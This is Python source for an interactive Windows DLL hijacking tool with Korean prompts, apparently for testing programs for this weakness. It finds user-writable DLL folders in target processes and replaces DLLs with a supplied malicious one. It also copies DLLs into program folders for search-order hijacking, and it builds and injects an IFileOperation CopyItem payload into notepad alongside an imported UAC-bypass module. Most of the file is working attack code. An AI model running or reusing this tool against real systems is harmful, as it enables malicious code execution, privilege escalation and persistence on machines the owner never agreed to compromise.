import os
from tqdm import tqdm
from pyinjector import inject
import subprocess
import psutil
import shutil
from pywinauto import *
import time
from uac_bypass import uac_bypass



class hiJacking():

    def __init__(self):
        print("\n\nExecute DLL HiJacking mode------------------------------------------")
        input_op = input("\n입력할 옵션을 선택하시오.\n1. PID 입력하기    2. exe 경로 입력하기\n번호 입력:")
        print("\n")
        self.pid = []
        if input_op == '1':
            self.U_PID()
        elif input_op == '2':
            self.U_exe()
        else:
            print('ERROR::Wrong number..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            print('\n')
            if ans == 'y':
                self.__init__()
            else: 
                print("\n\n--End the program--\n")
                return
    
    def U_PID(self):
        del_pidlist = [0, 4, 120, 540, 748, 848, 860, 908, 916, 948,
                       988, 1196, 1256, 1420, 1424, 1436, 1456, 1468, 1548, 1628,
                       1740, 1748, 1812, 1820, 1828, 1924, 2000, 2072, 2096, 2172,
                       2204, 2220, 2284, 2368, 2424, 2448, 2512, 2584, 2608, 2616,
                       2832, 3012, 3024, 3160, 3180, 3232, 3472, 3568, 3656, 3708,
                       3724, 3744, 3828, 3888, 3972, 4116, 4364, 4372, 4424, 4464,
                       4712, 4788, 5088, 5424, 5444, 5804, 5888, 6440, 8224, 8248,
                       8344, 8484, 8620, 8724, 8744, 8852, 9272, 9312, 9612, 9820,
                       10228, 10236, 10408, 11228, 11540, 11852, 13152, 13712, 14300, 15280,
                       16536, 17396]
        print('<안내 - PID를 입력해주세요>')
        pid_in = input('pid 1개 입력 시 맨 앞에 \'o\', 2개 이상 입력 시 \'m\' 명령어를 입력해주세요.\n예시> 1개 -> o pid\n      2개 이상 -> m pid pid ...\n입력할 명령어:')
        pid_arr = pid_in.split(' ')
        del_index = []
        if pid_arr[0] == 'o':
            pid_arr.pop(0)
            self.pid.append(pid_arr[0])
            
        elif pid_arr[0] == 'm':
            pid_arr.pop(0)
            print('\n<안내 - 2개 이상의 PID를 입력받았습니다.>\n')
            print('<안내 - Windows의 기본 프로세스 PID를 필터링합니다.>')
            for i in range(0, len(pid_arr)):
                if int(pid_arr[i]) in del_pidlist:
                    print(f'WARNING::You cannot attack PID \'{pid_arr[i]}\'')
                    del_index.insert(0, i)
            for i in del_index:
                pid_arr.pop(i)
                    
            self.pid= pid_arr
                
                                
        else: 
            print('\nERROR::Wrong command..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            print('\n')
            if ans == 'y':
                self.__init__()
            else: 
                print("\n\n--End the program--\n")
                return 
                    
        
        print('\n<안내 - PID를 성공적으로 입력받았습니다.>')
        print("Attackable PID:", * self.pid)
        print("\n")
        self.select_attack_mode()
        

    def U_exe(self):
        print('<안내 - exe 경로 입력 옵션을 선택해주세요>')
        exe_op = input('1. 경로 1개 입력\n2. 경로 2개 이상 입력 시\n입력할 명령어:')
        self.exe_in = []
        print(f'\n<안내 - {exe_op}개의 exe 경로 입력해주세요>')
        if exe_op == '1':
            exe_in = input("입력:")
            self.exe_in.append(exe_in)
            
        elif exe_op == '2':
            exe_in = input("\"경로1\" \"경로2\" 형태로 입력해주세요.\n입력:")
            exe_in = exe_in.split(' ')
            for i in exe_in:
                self.exe_in.append(i)
        else: 
            print('\nERROR::Wrong number..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            if ans == 'y':
                self.U_exe()
            else: 
                print("\n\n--End the program--\n")
                return 

        for i in self.exe_in:
            if(os.path.isfile(i)):
                pass
            else:
                print('\nERROR::Wrong exe Path')
                ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
                if ans == 'y':
                    self.U_exe()
                else: 
                    print("\n\n--End the program--\n")
                    return
        print('\n<안내 - exe 경로를 성공적으로 입력받았습니다.>')
        self.select_attack_mode()
        
    def select_attack_mode(self):
        print('\n<안내 - 공격 방식을 선택해 주세요>')
        print('\n 1. Normal Hijacking')
        print('\n 2. Search Order Hijacking')
        print('\n 3. Abusing IFileOperation (exe only) -- 현재 일반 사용자로는 사용이 불가 합니다.')
        mode = input("Input Attack Mode : ")
        if str(mode) == "1":
            self.normal_hijack()
        elif str(mode) == "2":
            self.search_order_hijack()
        elif str(mode) == "3":
            self.abusing_IfileOperation()
        else:
            print('\nERROR::Wrong command..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            print('\n')
            if ans == 'y':
                self.select_attack_mode()
            else: 
                print("\n\n--End the program--\n")
                return 
            
        
    def U_dll(self):
        print("<안내 - 공격용 악성 dll 옵션을 입력해주세요>")
        dll_op = input('1. 직접 dll 입력하기\t2. 제공되는 dll 사용하기\n입력할 명령어:')
        if dll_op == '1':
            print('\n<안내 - \'직접 dll 입력하기\'를 선택하셨습니다.>')
            dll__in=input('사용하실 dll의 경로를 입력해주세요.\n입력할 경로:')
            
        elif dll_op == '2':
            print('\n<안내 - \'제공되는 dll 사용하기\'를 선택하셨습니다.>')
            
            current_path = os.getcwd()
            dll__in = current_path.replace('\\','/') + "/CreateDLL.dll"
               
        else: 
            print('\nERROR::Wrong number..')
            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
            if ans == 'y':
                self.U_dll()
            else: 
                print("\n\n--End the program--\n")
                return

        print('\n<안내 - dll 경로 설정을 완료했습니다.>\n')
        return dll__in
            
            
    #Listdlls.exe 파일을 이용하여 입력된 pid에서 로드하는 dll 목록을 가져옴
    def list_dll(self,pid):
        list_dll_path = os.getcwd() + "/" + "Listdlls.exe "
        stream = os.popen(list_dll_path + str(pid))
        
        dlls = stream.read()
        program_name = ""
        list_dlls = []
        list_programs = []
        path_lists = []

        try:
            split_text = dlls.replace("\\","/").replace('  ','\n').split('\n')
            
       
            for i in split_text:
                path_lists.append(i.replace(" ",""))
            
            for i in path_lists:
                if i.endswith(".exe"):
                    list_programs.append(i)
                if i.endswith(".dll"):
                    list_dlls.append(i)   
            for i in list_programs:
                if i.startswith("C:/"):
                    program_name = i
        except:
            print("\nERROR::rWrong pid...")
        return program_name, list_dlls
        
        
        #dll이 저장되어 있는 폴더의 일반 유저 또한 쓰기 권한이 있는지 검증
    def check_permission(self,path):
        user_perm_dir = []
        user_perm_file = []
        for i in path:
            dir_path = os.path.dirname(i)
            try:
                open(dir_path+"/test.txt","w")
                os.remove(dir_path+"/test.txt")
                name_split = i.split('/')
                name = name_split[-1]
                user_perm_file.append(name)
                user_perm_dir.append(i)
                # if os.access(dir_path,os.W_OK):
                #     name_split = i.split('/')
                #     name = name_split[-1]
                #     user_perm_file.append(name)
                #     user_perm_dir.append(i)
            except:
                pass
        return user_perm_file,user_perm_dir
    
    #strings 명령어를 이용하여 dll을 하드코딩으로 로드하는지 확인
    def find_string(self,name,list_name,list_dir):
        stream = os.popen("strings " + name)
        strings = stream.read()
        strings = strings.replace("\\",'/').split("\n")
        string_dll = []
        for i in strings:
            if i.endswith(".dll"):
                string_dll.append(i)
        for string in string_dll:
            if  string in list_name:
                return True
            elif string in list_dir:
                return True
            else:
                return False
            
    #exe파일을 직접 실행하여 pid를 가져옴
    def create_process(self,path):
            return subprocess.Popen([path]).pid
        
    #악성 dll을 입력받은 경로로 바꿔줌
    def change_dll(self,dll_path,hijactable_dll_path,program_name):
        successed_list = []
        tmp = os.environ['TMP']
        for i in hijactable_dll_path:
            
            original_name_list = i.split('/')
            original_name = original_name_list[-1]
            path = tmp.replace("\\","/") + "/" + original_name
            dir_path = os.path.dirname(i)
            
            shutil.move(i,tmp)
            shutil.copy2(dll_path,i)
            pid = self.create_process(program_name)
            app = application.Application()
            app.connect(process=pid)

            try:
                message = app.window(title_re="SECU") 
                message.OKButton.click()
                successed_list.append(i)
                psutil.Process(pid).kill()
            except:
                print("\nERROR:: Hijacking Fail\n")
                ans = input('Do you want to try again? Back to the beginning DLL HiJacking\nYes = \'y\', No =\'q\'\ninput: ')
                if ans == 'y':
                    self.__init__()
                else: 
                    print("\n\n--End the program--\n")
                    return 
                    
            time.sleep(0.1)  # import time
            try:
                os.remove(i)
                shutil.move(path,dir_path)
            except:
                os.remove(path)
                print("\nERROR::Cannot remove or write DLL\n")
                print(f'\nPlease replace \"' + path + "\" to \"" + dir_path +"\"")
        
        return successed_list
            
                  
        
    def search_order_hijack(self):
        if len(self.pid) == 0:
            for i in self.exe_in:
                self.pid.append(self.create_process(i))
        for i in tqdm(range(0,len(self.pid))):
            pid = int(self.pid[i])
            print(f'{len(self.pid)}개의 pid 중 {i+1}번째 pid로의 Search Order hiJacking!')
            program_name, list_dlls = self.list_dll(pid)
            program_path = os.path.dirname(program_name)
            changed_path = []
            search_order_path = []
            for j in list_dlls:
                name_split = j.split('/')
                name = name_split[-1]
                search_order_path.append(program_path + "/" + name)
                    
            for j in range(len(list_dlls)):
                try:
                    shutil.copy2(list_dlls[j],search_order_path[j])
                    changed_path.append(search_order_path[j])
                except:
                    print("\nERROR:: \"" + list_dlls[j] + "\" 를 복사 할 수 없습니다.")
                    pass
                    
                    
            newPid = self.create_process(program_name)
            program_name, newList_dlls = self.list_dll(newPid)

            successed_path = {}

            for j in newList_dlls:
                if j in changed_path:
                    name_split = j.split('/')
                    name = name_split[-1]
                        
                    for k in list_dlls:
                        name2_split = k.split('/')
                        name2 = name2_split[-1]
                        if name == name2:
                            successed_path[j] = k

            psutil.Process(newPid).kill()
                    
            for j in changed_path:
                    try:
                        os.remove(j)
                    except:
                        print("\nERROR::바꾼 파일을 삭제 할수가 없습니다. 직접 삭제해 주세요.")
                
            print(f'\n{str(pid)} 에서 Search Order Hijacking에 취약한 DLL 목록')
            for key,value in successed_path.items():
                print(f'\n 원본 DLL 경로 : {value} -> 공격에 성공 했을 시 DLL 경로 : {key}')
            print("\n\n-------------------------\n")   
        print("\n\n--End the program--\n")
    # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
    # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
    def normal_hijack(self):
        
        path_dll = self.U_dll()
        successed_list = []
        
        if len(self.pid) == 0:
            for i in self.exe_in:
                self.pid.append(self.create_process(i))
        for i in range(0,len(self.pid)):
            print(f'{len(self.pid)}개의 pid 중 {i+1}번째 pid로의 Normal hiJacking!')
            pid = int(self.pid[i])
            program_name, list_dlls = self.list_dll(pid)
            file_list,dir_list = self.check_permission(list_dlls)
            
            if not len(dir_list) == 0:
                if self.find_string(program_name,file_list,dir_list):
                    print("Detect programs vulnerable to dll injection")
                    print("Vulnerable Program Name : " + program_name)
                    psutil.Process(pid).kill()
                    successed_list = self.change_dll(path_dll,dir_list,program_name)
                    print("Vulnerable dll Lists : ")
                    for j in successed_list:
                        print(j)
                else:
                    print("\nERROR::Not Found vulnerable dll path")
                    ans = input('Do you want to try again? Back to the beginning DLL HiJacking\nYes = \'y\', No =\'q\'\ninput: ')
                    if ans == 'y':
                        self.__init__()
                    else: 
                        print("\n\n--End the program--\n")
            else:
                print("\nERROR::Not Found writable dir")
                ans = input('Do you want to try again? Back to the beginning DLL HiJacking\nYes = \'y\', No =\'q\'\ninput: ')
                if ans == 'y':
                    self.__init__()
                else: 
                    print("\n\n--End the program--\n")
                    return 
        
    
    def abusing_IfileOperation(self):
        abspath = os.path.dirname(__file__)
        dll_abspath = self.U_dll()
        successed_list = []
        
        # #3. 수정 완료한 dll.cpp를 Cmake를 이용하여 빌드(종속성 에러 때문에 Cmake 설치 요구 표시)
        if(os.system("cmake")):
            os.system("cmake.msi")
            print("Cmake 설치 후 다시 기능을 실행해 주세요")
            return  
        else:
            os.system("cls")
            #pass
        if len(self.pid) == 0:
            for i in self.exe_in:
                self.pid.append(self.create_process(i))
        for i in range(0,len(self.pid)):
            print(f'{len(self.pid)}개의 pid 중 {i+1}번째 pid로의 Normal hiJacking!')
        # # DLL 리스트 파싱 후 원활한 파일 이동을 위해 프로세스 종료
            exe_pid = int(self.pid[i])
            
            program_name, list_dlls = self.list_dll(exe_pid)
            
            psutil.Process(exe_pid).kill()
            dll_abspath = dll_abspath.replace("\\","\\\\")
            # 원본을 전부 dll_tmp 로 복사하기
            for j in list_dlls:
                if j.endswith("CreateDLL.dll"):
                    
                    shutil.copy2(j,abspath+"\\"+"dll_tmp")
                    original_dll_path = os.path.dirname(j)
                    dll_name = j.split("/")[-1]
                    
                # #2. IFileOperation 코드에 원하는 인자를 세팅 후 빌드 하기
                    
                    original_dll_path = original_dll_path.replace("/","\\\\")
                    dll_code = "int haxproc(){HRESULT test = CopyItem(L\"%s\", L\"%s\", L\"%s\");if (SUCCEEDED(test)){MessageBoxA(0, \"Stage-2 Installed\", 0, 0);}return 0;}"%(dll_abspath,original_dll_path,dll_name)
                    
                    with open("CreateIFileOperationDLL/reference.cpp",'r',encoding='utf-8') as refFile:
                        refText = refFile.readlines()
                        refFile.close()
                    with open("CreateIFileOperationDLL/dll.cpp",'w',encoding='utf-8') as dllFile:
                        for i in refText:
                            dllFile.write(i)
                        dllFile.write(str(dll_code))
                        dllFile.close()
                    
                    # dll 빌드 하기
                    os.system("cd "+ abspath + "/"+"CreateIFileOperationDLL && .\Build.bat")
                    time.sleep(1)
                    os.system("cls")
                    # notePad에 인젝션 하기
                    exploit_dll_path = abspath + "/"+"CreateIFileOperationDLL/Debug/exploitDll.dll"
                
                    
                    uac = uac_bypass()
                    #notePad_pid = uac.execute()
                    notePad_pid = self.create_process("C:/Windows/System32/notepad.exe")
                
                    
                    try:

                        inject(notePad_pid,exploit_dll_path)
                        print("Attack Injection Success!")
                    except Exception as e:
                        
                        print("\nERROR::Attack Injection Fail")
                        ans = input('Do you want to try again? Back to the beginning DLL HiJacking\nYes = \'y\', No =\'q\'\ninput: ')
                        if ans == 'y':
                            self.__init__()
                        else: 
                            print("End the program")
                    time.sleep(1)
                    app = Application(backend="win32").connect(process=notePad_pid)
                    try:
                        dlg = app.window(title_re="오류")
                        dlg.확인.click()
                        pass
                    except:
                        
                        print("\nERROR::Attack Injection Fail")
                        ans = input('Do you want to try again? Back to the beginning DLL HiJacking\nYes = \'y\', No =\'q\'\ninput: ')
                        if ans == 'y':
                            self.__init__()
                        else: 
                            print("\n\n--End the program--\n")
                    else:
                        # 6. 불필요한 프로세스 종료 후 하이제킹한 DLL 이 로드 될 수 있도록 실행
                        
                        psutil.Process(notePad_pid).kill()
                        
                        #다음을 위해 파일 정리하기   
                        os.remove(abspath + "/"+"CreateIFileOperationDLL\CMakeCache.txt")
                        shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\CMakeFiles")
                        shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\Debug")
                        os.remove(abspath + "/"+"CreateIFileOperationDLL\dll.cpp")
                    
                        
                        
                        hijacked_pid = self.create_process(program_name)
                        original_dll_path = original_dll_path.replace("\\\\","/").replace("\\","/")   
                        dll_tmp_path = abspath + "/" + "dll_tmp"+"/"+dll_name
                        # 7. 기본 악성 DLL을 사용시 messageBoxA가 띄워지므로 pywinauto를 이용하여 확인 버튼 클릭 정상 동작시 성공으로 간주
                        # 4. 원본 dll을 복사 hijacking 종료 후 다시 원상 복귀
                        os.system("cls")
                        app = Application(backend="win32").connect(process=hijacked_pid)
                        try:
                            dlg = app.window(title_re="SECU")
                            dlg.확인.click()
                            print("Hijacking Success!")
                            successed_list.append(original_dll_path + "/" + dll_name)
                        except:
                            print("\nERROR::IFileOperation Hijacking Fail")
                            ans = input('Do you want to try again? Back to the beginning DLL HiJacking\nYes = \'y\', No =\'q\'\ninput: ')
                            if ans == 'y':
                                self.__init__()
                            else: 
                                print("\n\n--End the program--\n")
                        psutil.Process(hijacked_pid).kill()
                        # shutil.copy2(dll_tmp_path,original_dll_path)
                        # os.remove(dll_tmp_path)
                        original_dll_path = original_dll_path.replace("/","\\\\")
                        dll_tmp_path = dll_tmp_path.replace("\\","/").replace("/","\\\\")
                        dll_code = "int haxproc(){HRESULT test = CopyItem(L\"%s\", L\"%s\", L\"%s\");if (SUCCEEDED(test)){MessageBoxA(0, \"Stage-2 Installed\", 0, 0);}return 0;}"%(dll_tmp_path,original_dll_path,dll_name)
                        with open("CreateIFileOperationDLL/reference.cpp",'r',encoding='utf-8') as refFile:
                            refText = refFile.readlines()
                            refFile.close()
                        with open("CreateIFileOperationDLL/dll.cpp",'w',encoding='utf-8') as dllFile:
                            for i in refText:
                                dllFile.write(i)
                            dllFile.write(str(dll_code))
                            dllFile.close()
                    

                        os.system("cd " + abspath + "/"+ "CreateIFileOperationDLL && .\Build.bat")
                        time.sleep(1)
                        os.system("cls")
                        
                        notePad_pid = self.create_process("C:/Windows/System32/notepad.exe") 
                        for proc in psutil.process_iter():
                            if proc.name().endswith("notepad.exe"):
                                notePad_pid = proc.pid
                    
                        try:
                            original_dll_path.repalce("\\\\","/")
                            dll_tmp_path.replace("\\\\","/")
                            inject(notePad_pid,exploit_dll_path)
                            print("Restore Injection Success!")
                            
                        except:

                            print("\nERROR::Restore Injection Fail")
                            print("\nFile Name : " + original_dll_path)
                            print("\nYou must restore original dll file yourself!!")
                            
                        time.sleep(1)
                        psutil.Process(notePad_pid).kill()
                        os.remove(abspath + "/"+"CreateIFileOperationDLL\CMakeCache.txt")
                        shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\CMakeFiles")
                        shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\Debug")
                        os.remove(abspath + "/"+"CreateIFileOperationDLL\dll.cpp")
                    print("\nAbusing IFileOperation을 통해 공격에 성공한 DLL 목록")
                    print(f'\n프로그램 이름 : {program_name}')
                    for j in successed_list:
                        print(f'\n{j}')
                        
                        